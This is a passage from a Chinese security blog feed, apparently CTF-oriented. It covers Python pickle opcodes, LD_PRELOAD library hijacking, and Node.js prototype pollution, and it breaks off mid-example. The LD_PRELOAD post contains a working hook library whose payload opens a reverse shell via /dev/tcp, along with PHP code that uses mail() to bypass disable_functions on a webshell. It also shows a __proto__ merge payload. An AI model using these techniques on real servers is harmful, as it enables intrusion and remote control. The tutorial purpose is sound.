class="hljs-string">b&#x27;\x97&#x27;</span>  <span class="hljs-comment"># push next out-of-band buffer</span><br>READONLY_BUFFER  = <span class="hljs-string">b&#x27;\x98&#x27;</span>  <span class="hljs-comment"># make top of stack readonly</span><br></code></pre></td></tr></table></figure><h3 id="pickle版本速览"><a href="#pickle版本速览" class="headerlink" title="pickle版本速览"></a>pickle版本速览</h3><ul><li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307"><strong>PEP 307</strong></a>。</li><li>v3 版协议添加于 Python 3.0。<strong>它具有对 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes"><code>bytes</code></a> 对象的显式支持</strong>，且无法被 Python 2.x 打开。这是<strong>目前默认使用的协议</strong>，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154"><strong>PEP 3154</strong></a>。</li></ul><h3 id="PVM解析动图"><a href="#PVM解析动图" class="headerlink" title="PVM解析动图"></a>PVM解析动图</h3><h4 id="1-创建元组并插入元素"><a href="#1-创建元组并插入元素" class="headerlink" title="1.创建元组并插入元素"></a>1.创建元组并插入元素</h4><p><img src="https://goodapple.top/wp-content/uploads/2022/11/20200320230631-6204866e-6abc-1.gif" alt="img"></p><h4 id="2-加载并调用函数模块"><a href="#2-加载并调用函数模块" class="headerlink" title="2.加载并调用函数模块"></a>2.加载并调用函数模块</h4><p><img src="https://goodapple.top/wp-content/uploads/2022/11/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p><h2 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h2><ul><li><a href="https://goodapple.top/archives/1069">Pickle反序列化 - 枫のBlog (goodapple.top)</a></li><li><a href="https://tttang.com/archive/1782/">https://tttang.com/archive/1782/</a></li><li><a href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结 - 先知社区 (aliyun.com)</a></li><li><a href="https://docs.python.org/zh-cn/3/library/pickle.html#">pickle — Python 对象序列化 — Python 3.11.3 文档</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>python安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python安全</tag>
      
      <tag>pickle反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>劫持LD_PRELOAD</title>
    <link href="/2023/01/12/%E5%8A%AB%E6%8C%81LD_PRELOAD/"/>
    <url>/2023/01/12/%E5%8A%AB%E6%8C%81LD_PRELOAD/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>LD_PRELOAD是Linux系统中的一个环境变量，作用是在程序在运行链接之前优先加载LD_PRELOAD中的链接库，因此通过指定LD_PRELOAD变量我们可以实现二进制程序的链接库劫持，覆盖重写原来的系统调用。</p><h2 id="0x01-劫持系统命令"><a href="#0x01-劫持系统命令" class="headerlink" title="0x01 劫持系统命令"></a>0x01 劫持系统命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> LD_PRELOAD=&lt;path_to_so&gt;   <span class="hljs-comment">#设置</span><br><span class="hljs-comment">#或者可以执行时指定，好处是仅作用于本次命令</span><br><span class="hljs-comment">#LD_PRELOAD=$PWD/hook_ls.so ls</span><br><span class="hljs-built_in">unset</span> LD_PRELOAD    <span class="hljs-comment">#解除</span><br></code></pre></td></tr></table></figure><p>以ls命令为例使用<code>readelf -Ws /usr/bin/ls</code>查看ls命令调用的库函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Num:    Value          Size Type    Bind   Vis      Ndx Name<br>     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND <br>     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_toupper_loc@GLIBC_2.3 (2)<br>     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.2.5 (3)<br>     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND cap_to_text<br>     4: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __progname@GLIBC_2.2.5 (3)<br>     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sigprocmask@GLIBC_2.2.5 (3)<br>     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __snprintf_chk@GLIBC_2.3.4 (4)<br>     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.2.5 (3)<br>     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (3)<br>     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.2.5 (3)<br>    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (3)<br>    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strncmp@GLIBC_2.2.5 (3)<br>    12: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTable<br>    13: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.2.5 (3)<br> . . . . . . . <br></code></pre></td></tr></table></figure><p>选择strncmp进行劫持，重新定义strncmp的函数体，注意<strong>参数列表必须保持不变</strong>，记得unsetenv。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//hook_ls.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;echo Hijacked!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">strncmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s2, <span class="hljs-type">size_t</span> __n)</span> &#123;    <br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译并设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -shared -fPIC hook_ls.c -o hook_ls.so<br><span class="hljs-built_in">export</span> LD_PRELOAD=<span class="hljs-variable">$PWD</span>/hook_ls.so<br></code></pre></td></tr></table></figure><p>最后执行ls</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[spring@VM codes]$ <span class="hljs-built_in">export</span> LD_PRELOAD=<span class="hljs-variable">$PWD</span>/hook_ls.so<br>[spring@VM codes]$ <span class="hljs-built_in">ls</span><br>Hijacked!<br>hook_ls.c  hook_ls.so<br></code></pre></td></tr></table></figure><h2 id="0x02-绕过-Disable-Functions"><a href="#0x02-绕过-Disable-Functions" class="headerlink" title="0x02 绕过 Disable_Functions"></a>0x02 绕过 Disable_Functions</h2><p>在拿到php环境下的webshell时常常遇到Disable_Functions禁用系统命令执行的情况，使用LD_PRELOAD也可以实现bypass。</p><p>根据上述LD_PRELOAD劫持的特点，欲将其用于bypass Disable_Functions需要满足以下几个条件：</p><ul><li>由于LD_PRELOAD是在程序链接之前起作用，因此我们无法在现有php进程中实现劫持，<strong>必须要寻找能够创建新进程的函数</strong>。</li><li><strong>环境变量需要可控</strong>，例如可以使用putenv()函数。</li></ul><h3 id="mail"><a href="#mail" class="headerlink" title="mail()"></a>mail()</h3><p>mail()函数是php内置用于发送邮件的函数，在底层是调用Linux中的sendmail函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//mail.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;a@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行并使用strace跟踪系统调用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -f php mail.php 2&gt;&amp;1 &#124; grep -A2 -B2 execve<br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[spring@VM codes]$ strace -f php mail.php 2&gt;&amp;1 &#124; grep -A2 -B2 execve<br>execve(<span class="hljs-string">&quot;/usr/local/lighthouse/softwares/php/bin/php&quot;</span>, [<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;mail.php&quot;</span>], 0x7ffefe042d70 /* 30 vars */) = 0<br>brk(NULL)                               = 0x1e22000<br>arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd432847b0) = -1 EINVAL (无效的参数)<br>--<br>[pid 2432766] fcntl(4, F_SETFD, 0)      = 0<br>[pid 2432767] dup2(3, 0)                = 0<br>[pid 2432767] execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/usr/sbin/sendmail -t -i &quot;</span>], 0x1e22d90 /* 30 vars */ &lt;unfinished ...&gt;<br>[pid 2432766] fstat(4,  &lt;unfinished ...&gt;<br>[pid 2432767] &lt;... execve resumed&gt;)     = 0<br>[pid 2432766] &lt;... fstat resumed&gt;&#123;st_mode=S_IFIFO&#124;0600, st_size=0, ...&#125;) = 0<br>[pid 2432767] brk(NULL)                 = 0x55a7a0633000<br>--<br>[pid 2432767] rt_sigaction(SIGQUIT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f5dd9a87790&#125;, &#123;sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7f5dd9a87790&#125;, 8) = 0<br>[pid 2432767] rt_sigaction(SIGCHLD, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER&#124;SA_RESTART, sa_restorer=0x7f5dd9a87790&#125;, &#123;sa_handler=0x55a79e54a180, sa_mask=[], sa_flags=SA_RESTORER&#124;SA_RESTART, sa_restorer=0x7f5dd9a87790&#125;, 8) = 0<br>[pid 2432767] execve(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, [<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>], 0x55a7a0641c30 /* 30 vars */) = -1 ENOENT (没有那个文件或目录)<br>[pid 2432767] <span class="hljs-built_in">stat</span>(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, 0x7ffc517fd470) = -1 ENOENT <br>[pid 2432767] <span class="hljs-built_in">stat</span>(<span class="hljs-string">&quot;/usr/sbin/sendmail&quot;</span>, 0x7ffc517fd450) = -1 ENOENT <br></code></pre></td></tr></table></figure><p>明显是调用了<code>/usr/sbin/sendmail</code>，同时execve启用了新进程，因此劫持sendmail()即可劫持mail()。</p><p>下一步查看sendmail()的库函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">readelf -Ws /usr/sbin/sendmail<br></code></pre></td></tr></table></figure><p>(我的vps里没有sendmail拓展，不过问题不大后续可以解决这个问题)</p><p>挑选getuid函数进行劫持：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//hook_getuid.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;port&gt; 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uid_t</span> <span class="hljs-title function_">getuid</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br><span class="hljs-comment">//最后编译生成 gcc -shared -fPIC hook_getuid.c -o hook_getuid.so</span><br></code></pre></td></tr></table></figure><p>然后在脚本中设置环境变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="hljs-comment">// 注意这里的目录要有访问权限</span><br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;test@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行即可实现劫持。</p><h3 id="error-log"><a href="#error-log" class="headerlink" title="error_log()"></a>error_log()</h3><p>error_log()和mail()一样也会调用sendmail，劫持的过程没有差别不再赘述</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="hljs-comment">// 注意这里的目录要有访问权限</span><br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>能创建新进程的函数含有很多，有时候要根据主机所安装的拓展因地制宜。</p><h2 id="0x03-attribute-constructor"><a href="#0x03-attribute-constructor" class="headerlink" title="0x03  __attribute__((constructor))"></a>0x03  __attribute__((constructor))</h2><p>上面提到在我的vps中没有sendmail拓展，因此事实上我们无法实现劫持，因此我们需要一个通用的解决方案，那就是C语言的一个拓展修饰符<code>__attribute__((constructor))</code>，由它所修饰的函数将在程序main()函数之前执行，如果它存在于动态链接库中，那么它将会在动态链接库被系统加载之前执行。这样就可以实现对于链接的劫持，而不是局限于特定的系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//同样去劫持ls</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo Hijacked!&quot;</span>);<br>&#125;<br><span class="hljs-comment">//编译执行 gcc -shared -fPIC hook_ls.c -o hook_ls.so</span><br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.anquanke.com/post/id/254388">https://www.anquanke.com/post/id/254388</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>LD_PRELOAD</tag>
      
      <tag>hijack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux系统编程</title>
    <link href="/2023/01/01/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/01/01/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nodejs原型链污染</title>
    <link href="/2022/12/30/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2022/12/30/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-原型链与原型链继承"><a href="#0x00-原型链与原型链继承" class="headerlink" title="0x00 原型链与原型链继承"></a>0x00 原型链与原型链继承</h2><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>原型链污染(<strong>prototype pollution</strong>)是js独有的安全问题，其原因主要是因为js中几乎所有类的所有属性都可以公开访问和修改，通过修改多个可控变量去覆盖<code>__proto__</code>属性即可污染其它类，即如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><p>原型链污染发生的两个场景是：</p><ul><li><strong>不安全的对象递归合并</strong></li><li><strong>按路径定义属性</strong>。</li></ul><p>在js中每个实例对象object都有个原型对象，原型对象又有对应的原型对象，以此类推可构成<strong>原型链</strong>，层层向上知道第一个原型对象为null。</p><p>要访问一个实例对象的原型对象，有以下方式：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">objectname</span>.[[proto<span class="hljs-keyword">type</span>]]<br><span class="hljs-title">objectname</span>.proto<span class="hljs-keyword">type</span><br><span class="hljs-title">objectname</span>[<span class="hljs-string">&quot;__proto__&quot;</span>]<br><span class="hljs-title">objectname</span>.__proto__<br><span class="hljs-title">objectname</span>.constructor.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>在定义类构造函数的时候，有一个预定义属性<code>prototype</code>，他就是一个原型对象。在实例化对象的时候会生成一个属性<code>__proto__</code>，它所指向的便是这个对象构造函数的prototype，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Class1</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">var</span> = <span class="hljs-literal">null</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Class2</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">var</span> = <span class="hljs-literal">null</span><br>&#125;<br><br><span class="hljs-comment">//将Class2的原型指向Class1</span><br><span class="hljs-title class_">Class2</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Class1</span><br><span class="hljs-keyword">let</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class2</span>()<br><br><span class="hljs-comment">//打印Class1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;obj.__proto__&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><h3 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h3><p>类在实例化的时候会拥有类自身<code>prototype</code>中的属性和方法，即<code>object</code>会继承其<code>__proto__</code>属性指向的原型对象的属性和方法，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&quot;time&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&quot;spring&quot;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>();<br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br><span class="hljs-comment">//打印Name:spring time</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name:<span class="hljs-subst">$&#123;son.first_name&#125;</span> <span class="hljs-subst">$&#123;son.last_name&#125;</span>`</span>)<br><br></code></pre></td></tr></table></figure><p>在输出last_name时，由于Son中没有此属性，于是到其原型对象<code>son.__proto__</code>，也就是Father实例中寻找，如果依然没找到，那么就继续到<code>son.__proto__.__proto__</code>寻找，直到找到为止，未找到返回<code>undefined</code>。</p><p>至此总结出几个要点：</p><ul><li>每个构造函数(<code>constructor</code>)都有一个原型对象(<code>prototype</code>)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用<code>prototype</code>链实现继承机制</li></ul><h2 id="0x01-原型链污染"><a href="#0x01-原型链污染" class="headerlink" title="0x01 原型链污染"></a>0x01 原型链污染</h2><p>首先是json语法的一些规则：</p><ul><li>数据在名称&#x2F;值对中</li><li>数据由逗号分隔</li><li>花括号容纳对象</li><li>方括号容纳数组</li></ul><p>JSON键&#x2F;值对由<strong>键和值</strong>组成，<strong>键必须是字符串</strong>，值可以是字符串（string）、数值(number) 、对象（object）、数组（array）、true、false、null。</p><p>例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> object = &#123;<br>  <span class="hljs-string">&#x27;a&#x27;</span>: [&#123; <span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">2</span> &#125;, &#123; <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-number">4</span> &#125;]<br>&#125;;<br></code></pre></td></tr></table></figure><p>首先看一个语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">object[a][b] = value<br></code></pre></td></tr></table></figure><p>如果我们能同时控制a、b、value的值，将a设置为<code>__proto__</code>，那么就可以给object的原型ProtoClass设置一个值为value的属性b，即使原型中没有b属性也可以添加进去，与此同时所有原型链中含有ProtoClass的对象也将增加属性b，这就是<strong>原型链污染</strong>。</p><h2 id="0x02-merge引发的污染"><a href="#0x02-merge引发的污染" class="headerlink" title="0x02 merge引发的污染"></a>0x02 merge引发的污染</h2><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>一个简单的例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>merge函数对数组的键名进行了递归合并操作，注意<code>target[key] = source[key]</code>，如果我们能控制键名<code>source</code>为<code>__proto__</code>，同时利用target为其赋值，就可以为source的原型对象添加属性实现污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//1 2</span><br><span class="hljs-comment">//2</span><br></code></pre></td></tr></table></figure><p>可见o3被成功污染，实际上由于o1、o2、o3原型类统一，它们都会拥有属性b。</p><p>注意如果令b等于<code>&#123;a: 1, &quot;__proto__&quot;: &#123;b: 